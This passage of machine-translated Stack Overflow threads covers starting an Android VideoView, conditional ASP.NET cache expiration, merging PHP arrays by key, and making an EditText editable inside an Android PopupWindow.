            intent.setType("video/*");
            intent.setAction(Intent.ACTION_GET_CONTENT);

            startActivityForResult(Intent.createChooser(intent, "Complete action using"),PICK_FROM_GALLERY);
        }
    })  ;      
}

@Override
public void onActivityResult(int requestCode, int resultCode, Intent data)
{
    if (resultCode != RESULT_OK) return;

    if (requestCode == PICK_FROM_GALLERY) {
        Uri mVideoURI = data.getData();  
        videoView.setVideoURI(mVideoURI);
    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T12:43:08.263

您必须让 videoview 从添加`videoview.start();`. 代码：

```
public void onActivityResult(int requestCode, int resultCode, Intent data)
{
    if (resultCode != RESULT_OK) return;

    if (requestCode == PICK_FROM_GALLERY) {
        Uri mVideoURI = data.getData();  
        videoView.setVideoURI(mVideoURI);
        videoview.start();   //edited
    }

} 
```

# c# - 缓存过期

> ID：10989993
> 
> 赞同：0
> 
> 时间：2012-06-12T02:52:01.170
> 
> 标签：c#, asp.net, .net, caching

如何控制asp.net中的缓存过期？我使用绝对过期，缓存每 3 小时过期一次。现在我想添加一个条件，这样只有当条件为真时，缓存才会在 3 小时结束时过期。否则，如果条件为 false ，则缓存不应过期。

有没有办法我可以做到这一点？

我正在使用以下格式：

```
ctx.Cache.Insert("cachename", cacheValue, null,
                  DateTime.Now.AddHours(Int32.Parse(siteViewModel.ApplicationSettings["CacheDurationHours"])), System.Web.Caching.Cache.NoSlidingExpiration, 
                 System.Web.Caching.CacheItemPriority.Default,
                 null
                 ); 
```

持续时间为 3 小时。所以缓存会在 3 小时后自动过期。有没有办法用条件控制到期？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T07:04:07.230

关于什么：

```
DateTime absoluteExpiration = condition ? 
                  DateTime.UtcNow.AddHours(...) : 
                  Cache.NoAbsoluteExpiration;
ctx.Cache.Insert(..., absoluteExpiration, Cache.NoSlidingExpiration, ...); 
```

顺便说一句[，absoluteExpiration 参数的 MSDN 描述](http://msdn.microsoft.com/en-us/library/4y13wyk9.aspx)建议使用`DateTime.UtcNow`而不是`DateTime.Now`计算绝对过期时间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T03:03:07.167

您可以使 cacheValue 成为检查条件的委托

```
ctx.Cache.Insert("cachename", () => condition? null : cacheValue, null,
    DateTime.Now.AddHours(
        Int32.Parse(siteViewModel.ApplicationSettings["CacheDurationHours"])),
    System.Web.Caching.Cache.NoSlidingExpiration,
    System.Web.Caching.CacheItemPriority.Default,
    null
); 
```

然后要检索它，你会使用类似的东西

```
var del = ctx.Cache["cachename"] as Func<CacheValueType>;
if (del != null) cacheValue = del(); 
```

虽然更简单的方法是使用静态而不是缓存，并且只是一个私人日期作为到期日。

# php - 相似键上的数组合并

> ID：10989994
> 
> 赞同：-2
> 
> 时间：2012-06-12T02:52:14.557
> 
> 标签：php, arrays, multidimensional-array

我有 2 个数组。需要将两个数组合并/合并为 1 个数组。我不知道该怎么做。我的第一个数组如下所示：

```
Array
(
  [A626] => Array
    (
        [name] => MUHAMMAD FIZMIE ZAKARIA
        [email] => mfz@mail.edu.my
        [empid] => A626
    )

  [A672] => Array
    (
        [name] => MOHD FARID ISMADI
        [email] => 
        [empid] => A672
    )

  [A1149] => Array
    (
        [name] => MOHD JAZLI BIN MOHD ZABRI
        [email] => mjmz@mail.edu.my
        [empid] => A1149
    )

) 
```

第二个数组是：

```
Array
(
  [A1149] => Array
    (
        [empid] => A1149
        [online] => 1
        [ip] => 127.0.0.1
    )

  [A626] => Array
    (
        [empid] => A626
        [online] => 0
        [ip] => 
    )

  [A672] => Array
    (
        [empid] => A672
        [online] => 0
        [ip] => 
    )

) 
```

预期的结果应该是这样的：

```
Array
(
  [A626] => Array
    (
        [name] => MUHAMMAD FIZMIE ZAKARIA
        [email] => mfz@mail.edu.my
        [empid] => A626
        [online] => 0
        [ip] => 
    )

  [A672] => Array
    (
        [name] => MOHD FARID ISMADI
        [email] => 
        [empid] => A672
        [online] => 0
        [ip] => 
    )

  [A1149] => Array
    (
        [name] => MOHD JAZLI MOHD ZABRI
        [email] => mjmz@mail.edu.my
        [empid] => A1149
        [online] => 127.0.0.1
        [ip] => 1
    )

) 
```

请帮我。谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T02:58:22.350

```
foreach ($arr1 as $key => $user) {
    $arr3[$key] = array(
        'name' => $user['name'],
        'email' => $user['email'],
        'empid' => $user['empid'],
        'online' => $arr2[$key]['online'],
        'ip' => $arr2[$key]['ip'],
    );
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T03:15:46.380

[`array_merge_recursive`](http://br.php.net/manual/en/function.array-merge-recursive.php)正是[这样做的](http://codepad.org/7ymnnZvp)。使用您的阵列，您将获得额外的水平，`empid`因为它在两个阵列上。例如，结果`A626`：

```
[A626] => Array
    (
        [name] => MUHAMMAD FIZMIE ZAKARIA
        [email] => mfz@mail.edu.my
        [empid] => Array
            (
                [0] => A626
                [1] => A626
            )

        [online] => 0
        [ip] => 
    ) 
```

您可以忽略这一点，通过在循环`empid`中获取父键，您可以更轻松地访问：`foreach`

```
foreach($result as $empid=>$data) {
    // ...
} 
```

# android - 无法在弹出窗口中编辑编辑文本而不先关闭并重新调用它

> ID：10989995
> 
> 赞同：0
> 
> 时间：2012-06-12T02:52:31.023
> 
> 标签：android, android-edittext, popupwindow

我正在使用一个弹出窗口来显示一些信息，并有一个允许更改该信息的编辑按钮。我正在加载所有文本视图、按钮和编辑文本字段，并根据需要隐藏/显示它们。edittext 字段不允许我编辑它们。我已经尝试了以下关于将可聚焦设置为 true 的建议，但这不起作用。还有其他建议吗？

试过这个：[弹出窗口上的EditText](https://stackoverflow.com/questions/4134117/edittext-on-a-popup-window)

编辑：下面是我的代码的一部分。我刚刚包含了用于初始化编辑文本和显示弹出内容的部分，因为其他一切都在工作，而不是编辑文本。我正在使用表格布局，当用户单击一行时，会显示弹出窗口。请记住，我对 Java 和 Android 还是很陌生！

编辑＃2：选择edittext时软键盘未显示，但现在如果我关闭弹出窗口然后再次调用它，它将显示。然后我尝试强制显示软键盘，它显示在弹出窗口后面（另一个问题）。我能够选择数字 1，因为它几乎没有显示在弹出窗口后面，但它似乎也不起作用。此处的修复方法相同：关闭弹出窗口并重新调用它。 **所以我剩下的问题是能够输入编辑文本而不必关闭弹出窗口并重新调用它。** 因此，我正在更改此问题的标题。

```
row1.setOnClickListener(new OnClickListener() {

@Override
public void onClick(View v) {

    final EditText pwETBrand = (EditText) vPopUp.findViewById(R.id.et_editbrand);

    if (!infoClick) {
        infoClick = true;

        // Popup elements initialized earlier
        pwInfo.showAtLocation(llInfo, Gravity.CENTER_HORIZONTAL | Gravity.CENTER_VERTICAL, 0, 0);
        pwInfo.update(0, 0, llMain.getWidth()-50, llMain.getHeight()-100);
        pwInfo.setFocusable(true); 
```

……

```
 // Hide some elements initially until "EDIT" button is pressed
        pwETBrand.setVisibility(View.INVISIBLE); 
```

……

```
 // When EDIT button is pressed, hide default elements, and show edit elements
        pwEdit.setOnClickListener(new OnClickListener() {
            public void onClick(View v2) {
                pwETBrand.setVisivility(View.VISIBLE);
                // Other element settings go here
                pwInfo.setFocusable(true);
            }
        )}; 
```

……

```
 }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T18:12:29.260

我已经实施了一个解决方案，尽管它可能不是最好的解决方案。我在类初始化时设置了一个布尔字段，用于检查是否曾调用过弹出窗口。如果它还没有被调用，那么它将立即关闭弹出窗口并重新打开它，因为我的问题在于弹出窗口初始化。

```
 pwInfo.showAtLocation(llInfo, Gravity.CENTER_HORIZONTAL | Gravity.CENTER_VERTICAL, 0, 0);
    pwInfo.update(0, 0, llMain.getWidth()-50, llMain.getHeight()-100);
    pwInfo.setFocusable(true);

    if (pwFirst) {
        pwFirst = false;
        pwInfo.dismiss();
        pwInfo.showAtLocation(llInfo, Gravity.CENTER_HORIZONTAL | Gravity.CENTER_VERTICAL, 0, 0);
        pwInfo.update(0, 0, llMain.getWidth()-50, llMain.getHeight()-100);
        pwInfo.setFocusable(true);
    } 
```

不是最好的解决方案，但它有效。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-25T12:21:01.893

试试这个，

```
final PopupWindow popupWindow = new PopupWindow(popupView,LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT,true); 
```

为我工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T05:07:05.107

为此，请使用以下链接的代码，它可能会对您有所帮助。

[带有 Edittext 的弹出窗口](http://www.mkyong.com/android/android-prompt-user-input-dialog-example/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-01T11:16:20.747

每当你创建一个`PopupWindow`你必须`true`像`focusable`这样输入：

```
 PopupWindow(View contentView, int width, int height, boolean focusable) 

  final PopupWindow popupWindow = new PopupWindow(popupView,LayoutParams.WRAP_CONTENT,LayoutParams.WRAP_CONTENT,true); 
```

祝你好运